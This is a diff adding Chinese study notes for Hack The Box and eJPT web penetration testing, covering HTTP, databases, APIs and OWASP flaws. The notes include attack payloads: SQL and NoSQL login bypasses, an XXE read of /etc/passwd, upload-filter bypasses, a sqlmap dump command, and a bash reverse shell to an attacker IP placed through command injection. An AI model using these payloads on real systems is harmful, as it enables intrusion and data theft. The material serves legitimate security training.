@@ -903,3 +903,274 @@ Web 之所以適合入門，正是因為「目標明確」——哪裡能打字�
      * Oracle：查詢必須帶虛擬表 `FROM dual`[cite: 21]。
    - 知道後端是什麼資料庫，你的 Payload 才能精準命中[cite: 21]！
 ==================================================
+
+==================================================
+【HTB 筆記】Web 伺服器 (Web Server) 核心機制
+==================================================
+
+1. 運作職責：
+   - 監聽網路連線埠 (預設 HTTP: 80 / HTTPS: 443)[cite: 15]。
+   - 處理請求/回應模型 (Request/Response Model)[cite: 15]。
+   - 根據 URL 路由分發靜態資源 (HTML/CSS/IMG) 或動態傳遞給後端引擎[cite: 15, 16]。
+
+2. 關鍵 HTTP 狀態碼速查：
+   - 2xx (成功)：200 OK (請求成功)[cite: 15, 16]
+   - 3xx (重定向)：301 (永久轉址)、302 (暫時轉址)[cite: 16]
+   - 4xx (客戶端錯誤)：
+     * 401 Unauthorized (未認證/未登入)[cite: 16]
+     * 403 Forbidden (已認證但無權限/IP 被擋)[cite: 15, 16]
+     * 404 Not Found (資源不存在)[cite: 15, 16]
+   - 5xx (伺服器錯誤)：
+     * 500 Internal Server Error (後端代碼崩潰，潛在注入點)[cite: 16]
+     * 502 Bad Gateway / 504 Gateway Timeout (反向代理連不上後端)[cite: 16]
+
+3. 三大主流伺服器比較：
+   - Apache：模組化、.htaccess 配置、Linux 預設主力[cite: 18]。
+   - NGINX：事件驅動、極低資源佔用、反向代理首選[cite: 19]。
+   - IIS (微軟)：Windows Server 內建、支援 ASP.NET、整合 AD 驗證[cite: 20]。
+==================================================
+
+==================================================
+【實戰技巧】終端機偵測：curl 與伺服器標頭分析
+==================================================
+
+講義中提到的 `curl -I` 是打靶的第一秒必備神技：
+
+1. 獲取伺服器指紋 (Fingerprinting)：
+   指令：`curl -I http://<目標IP>:<Port>/`[cite: 17]
+   
+   常見回應與滲透思路：
+   - Server: Apache/2.4.49
+     -> 存在知名路徑遍歷漏洞 (CVE-2021-41773)，可直接 RCE 拿到 Root！
+   - Server: Microsoft-IIS/10.0
+     -> 後端高機率為 Windows，尋找 aspx 檔案或 Web.config 外洩[cite: 20]。
+   - Server: nginx/1.18.0
+     -> 測試 Nginx Alias 錯位配置漏洞或尋找上游代理端點。
+
+2. 盲測與目錄爆破依據 (Fuzzing / Gobuster)：
+   - 使用 Gobuster / Feroxbuster 爆破網站目錄時：
+     * 過濾 404：忽略不存在的頁面[cite: 15, 16]。
+     * 專注 200 / 301 / 302：挖掘未公開的登入頁面與備份檔案[cite: 16]。
+     * 警惕 403：通常代表該路徑確實存在 (例如 /admin)，只是阻擋直接存取，
+       可嘗試偽造 Header (如 X-Forwarded-For: 127.0.0.1) 繞過驗證！
+==================================================
+
+==================================================
+【HTTP 狀態碼】201 Created 核心定義
+==================================================
+
+1. 定義與意義：
+   - HTTP 狀態碼：201 Created
+   - 類別：2xx 成功 (Success)[cite: 16]
+   - 含意：請求已達成，並在伺服器端成功建立了一個或多個新資源。
+
+2. 與 200 OK 的核心差別：
+   - 200 OK：通用成功（包含讀取 GET、更新 PUT 等操作）[cite: 15, 16]。
+   - 201 Created：專門用於「建立新資料」（通常出現在 POST 或 PUT 請求成功時）。
+
+3. 常見伴隨標頭：
+   - Location: 指向新建立資源的 URI（例如 Location: /api/items/42）。
+==================================================
+
+==================================================
+【實戰技巧】打靶與滲透時 201 Created 的含義
+==================================================
+
+在 HTB 靶機或 API 滲透測試中，看到 201 是非常關鍵的正向信號：
+
+1. 檔案上傳 / WebShell 寫入成功：
+   - 嘗試上傳 PHP 木馬或反彈腳本：
+   - 若回傳 200 有時只是前端接收了提示；若回傳 `201 Created`，
+     高機率代表木馬檔案已經實體寫入伺服器磁碟！
+   - 此時立刻檢查 Response Headers 中的 `Location`，
+     往往能直接拿到 WebShell 的儲存路徑。
+
+2. API 盲測與越權新增 (BOLA / IDOR)：
+   - 當測試 RESTful API 的 POST 端點（如建立管理員帳號）：
+   - 送出請求後收到 `HTTP/1.1 201 Created`，
+     代表越權成功，新角色或高權限帳號已順利建立。
+==================================================
+
+==================================================
+【HTB 筆記】資料庫架構 (Database Architecture)
+==================================================
+
+1. 關係型資料庫 (RDBMS / SQL)：
+   - 核心結構：表 (Tables)、欄位 (Columns)、記錄 (Rows)，具備嚴格 Schema[cite: 21, 22]。
+   - 主鍵與外鍵 (PK / FK)：利用 user_id 將跨表格關聯起來 (如 users 與 posts)[cite: 21, 22]。
+   - 常見類型：MySQL, PostgreSQL, MSSQL, Oracle, SQLite[cite: 21, 22]。
+   - 標準語言：SQL (Structured Query Language)。
+
+2. 非關係型資料庫 (NoSQL)：
+   - 核心結構：鍵值對 (Key-Value)、文檔 (Document / JSON 格式)、圖形 (Graph)[cite: 23, 24]。
+   - 儲存特點：無固定結構限制，擴展性高[cite: 23]。
+   - 常見類型：MongoDB (文檔型), Redis (記憶體快取), Elasticsearch (搜尋引擎)[cite: 24, 25]。
+
+3. 資料庫連線 (以 PHP 為例)：
+   - 建立連線：$conn = new mysqli("localhost", "user", "pass", "database");[cite: 25]
+   - 執行查詢：$result = $conn->query($sql);[cite: 25]
+   - 遍歷輸出：while($row = $result->fetch_assoc()) { ... }
+==================================================
+
+==================================================
+【實戰思維】SQL vs. NoSQL 注入與滲透打法
+==================================================
+
+在 HTB 靶機中，判斷出後端用什麼資料庫，直接決定你手上的 Payload 該拿哪一把：
+
+1. 針對關係型資料庫 (SQL Injection - 最常見)
+   - 漏洞成因：像教材最後那行代碼一樣，字串直接拼接未經參數化查詢 (Prepared Statements)[cite: 26]。
+   - 實戰繞過 (Bypass Login)：
+     輸入：`' OR 1=1 -- `
+     後端 SQL 變成：`where name like '%' OR 1=1 -- '`
+     條件恆真，直接跳過密碼驗證登入管理員帳號！
+   - 常用自動化工具：`sqlmap -u "http://target.htb/search" --data="findUser=admin" --dump`
+     (自動把整顆資料庫的表格與密碼 Hash 全部拖出來)。
+
+2. 針對非關係型資料庫 (NoSQL Injection - 現代靶機熱門)
+   - 情境：後端採用 Node.js + MongoDB 架構[cite: 21, 24]。
+   - 實戰手法 (JSON 注入)：
+     當登入需要傳送 JSON：`{"username": "admin", "password": "123"}`
+     黑客竄改成 Mongo 運算符：`{"username": "admin", "password": {"$ne": ""}}`
+     (`$ne` 代表 Not Equal，只要密碼「不等於空字串」就通過，直接免密登入！)。
+
+3. 未授權存取 (Redis / Elasticsearch / MongoDB 經典送分題)
+   - 靶機常見設定錯誤：
+     工程師把 NoSQL 裝在伺服器上，卻忘記設定存取密碼。
+   - 滲透手法：
+     * Redis (Port 6379)：未授權直接連線，透過寫入 SSH 公鑰或 Crontab 排程秒拿 Root！
+     * MongoDB (Port 27017)：未授權直接連線，用 mongosh 拖出全部集合資料。
+==================================================
+
+==================================================
+【HTB 筆記】開發框架與 API 通訊架構
+==================================================
+
+1. 主流後端框架 (Frameworks) 與對應語言：
+   - PHP: Laravel, Symfony[cite: 28]
+   - Python: Django, Flask[cite: 28]
+   - JavaScript (Node.js): Express, NestJS[cite: 28]
+   - Ruby: Ruby on Rails[cite: 28]
+   - Java: Spring Boot
+
+2. API 通訊架構演進：
+   - SOAP (機翻「肥皂」)：
+     * 基於 XML 格式，語法繁重、開銷大，多見於老舊銀行與企業級系統[cite: 30]。
+   - RESTful API (機翻「休息」)：
+     * 當前絕對主流，多基於 JSON 格式，輕量且與 HTTP 方法緊密結合[cite: 31, 32]。
+     * GET: 檢索資源[cite: 32]
+     * POST: 新增資源[cite: 32]
+     * PUT: 覆蓋/更新資源[cite: 32]
+     * DELETE: 刪除資源[cite: 32]
+
+3. 傳參方式差異：
+   - 查詢參數 (Query String)：透過 URL 傳遞，如 `/search.php?item=apple`[cite: 29]。
+   - 請求主體 (Request Body)：透過 POST/PUT 送出，如 JSON 或 Form Data[cite: 29, 32]。
+==================================================
+
+==================================================
+【實戰技巧】API 滲透與框架安全測試
+==================================================
+
+在現代靶機或實戰測試中，打傳統 HTML 頁面可能毫無收穫，
+關鍵漏洞往往藏在前後端分離的 API 接口中：
+
+1. 未授權存取與物件層級越權 (BOLA / IDOR)
+   - 漏洞情境：REST API 常見設計為 `/api/v1/user/105`[cite: 31]。
+   - 實戰手法：
+     * 將網址後面的 ID 直接手動改成其他數字（如 `/api/v1/user/1`）[cite: 31]。
+     * 若後端未驗證該 Session 是否為本人，直接吐出管理員的私密資料，即宣告越權成立！
+
+2. 敏感 API 端點探測 (API Endpoint Fuzzing)
+   - 很多開發人員以為不放在網頁上的按鈕別人就不知道：
+   - 用工具 (如 Kiterunner, ffuf, Gobuster) 爆破常見 API 路由：
+     * `/api/v1/admin/users`
+     * `/api/swagger.json` 或 `/api/docs` (直接抓到後端完整的 API 文件手冊！)
+     * `/api/debug` 或 `/api/config`
+
+3. HTTP 請求方法竄改 (Verb Tampering)
+   - 情境：後端只對 `POST /admin/delete` 做了防護。
+   - 實戰手法：
+     * 用 Burp Suite 把 Request Method 從 POST 改成 PUT 或 GET[cite: 32]。
+     * 某些框架的認證中介層 (Middleware) 若只過濾特定方法，會直接被繞過！
+
+4. SOAP XML 專屬漏洞：XXE (XML 外部實體注入)
+   - 若遇到傳輸 SOAP XML 的老舊系統[cite: 30]：
+   - 在 XML 標頭注入外部實體 `<!ENTITY xxe SYSTEM "file:///etc/passwd">`[cite: 30]。
+   - 伺服器解析 XML 時，直接把主機密碼檔 (/etc/passwd) 的內容外洩出來！
+==================================================
+
+# 範例：讓工具自動去掃靶機上有哪些隱藏目錄
+gobuster dir -u http://154.57.164.80:36625/ -w /usr/share/wordlists/dirb/common.txt
+
+
+==================================================
+【HTB 筆記】常見網路漏洞 (OWASP 核心類型)
+==================================================
+
+1. 身分驗證與存取控制失效 (Authentication & Access Control)：
+   - 認證失效：繞過登入機制、Session 預測/固定、預設帳密。
+   - 越權訪問：未對敏感頁面 (如 /admin) 驗證操作者身分與角色 (RBAC 失效)。
+
+2. 惡意檔案上傳 (File Upload Vulnerabilities)：
+   - 成因：未驗證檔案 MIME-Type、副檔名、未禁用上傳目錄的執行權限。
+   - 繞過手法：雙重副檔名 (shell.php.jpg)、大小寫繞過 (.PhP)、空字節繞過。
+   - 危害：上傳 WebShell (如一句話木馬)，直接獲取伺服器初始 Shell。
+
+3. 命令注入 (Command Injection / OS Injection)：
+   - 成因：Web 程式呼叫系統函數 (如 system(), exec()) 時直接拼接使用者輸入。
+   - 關鍵拼接符：;  &&  ||  |  `cmd`  $(cmd)
+   - 危害：以 Web 服務權限 (如 www-data) 在作業系統底層執行任意指令。
+
+4. SQL 注入 (SQL Injection / SQLi)：
+   - 成因：資料與代碼混淆，未採行參數化查詢 (Prepared Statements)。
+   - 危害：繞過登入驗證、整庫資料外洩、讀寫伺服器檔案甚至呼叫系統指令。
+==================================================
+
+==================================================
+【實戰技巧】打靶通關的「標準突破漏洞鏈」
+==================================================
+
+在 HTB 靶機以及 eJPT 實戰考試中，這四大漏洞通常是以「組合拳」的方式出現：
+
+1. 第一步：利用 SQLi 或越權 (Access Control) 登入後台
+   - 在前端登入框測試 `' OR 1=1 -- ` 繞過身分驗證。
+   - 或是透過目錄爆破找到未授權的後台介面 (/admin)。
+
+2. 第二步：在後台尋找檔案上傳點或系統設定
+   - 進入後台後，尋找外掛安裝、大頭照更新、備份上傳功能。
+   - 上傳 PHP 反彈 Shell (php-reverse-shell.php)：
+     * 若被擋，測試雙重副檔名 `shell.php.png` 或 Burp 改 Content-Type。
+
+3. 第三步：觸發執行拿到伺服器控制權 (Initial Footprint)
+   - 存取上傳的檔案路徑 (例如 `/uploads/shell.php`)。
+   - 本機 Kali 開啟監聽 (`nc -lvnp 4444`)，成功接回反彈連線，拿到主機 Shell！
+
+4. 若無上傳點，轉找命令注入 (Command Injection)
+   - 測試後台所有的網路診斷工具 (Ping / Traceroute / DNS Lookup)。
+   - 傳入 Payload：`127.0.0.1; bash -i >& /dev/tcp/<Kali_IP>/4444 0>&1`
+   - 伺服器直接自動彈回 Root / www-data 命令列！
+==================================================
+
+==================================================
+【觀念釐清】命令注入 vs. WebShell vs. 反彈 Shell
+==================================================
+
+1. 命令注入 (Command Injection / 漏洞成因)：
+   - 性質：系統漏洞。
+   - 原理：應用程式直接拼接使用者輸入並呼叫系統 Shell 函數[cite: 30]。
+   - 用途：攻擊的「第一突破口」，用來執行第一行指令[cite: 30]。
+
+2. WebShell (後門腳本 / 持久化工具)：
+   - 性質：惡意檔案 (PHP, JSP, ASPX)。
+   - 原理：利用 Web 伺服器解析腳本的特性，透過 HTTP 請求下達指令[cite: 29]。
+   - 用途：維持訪問權限 (Persistence)，不需要建立即時網路通道即可控制。
+
+3. 反彈 Shell (Reverse Shell / 網路連線技術)：
+   - 性質：通訊模式 (Socket 連線)。
+   - 原理：受害端伺服器主動對攻擊者主機發起連線，並將 stdin/stdout 綁定給 Shell。
+   - 用途：繞過防火牆進站 (Inbound) 阻擋，獲得全互動式的命令列終端。
+==================================================
+
+bash -i >& /dev/tcp/<你的IP>/4444 0>&1  反彈
+
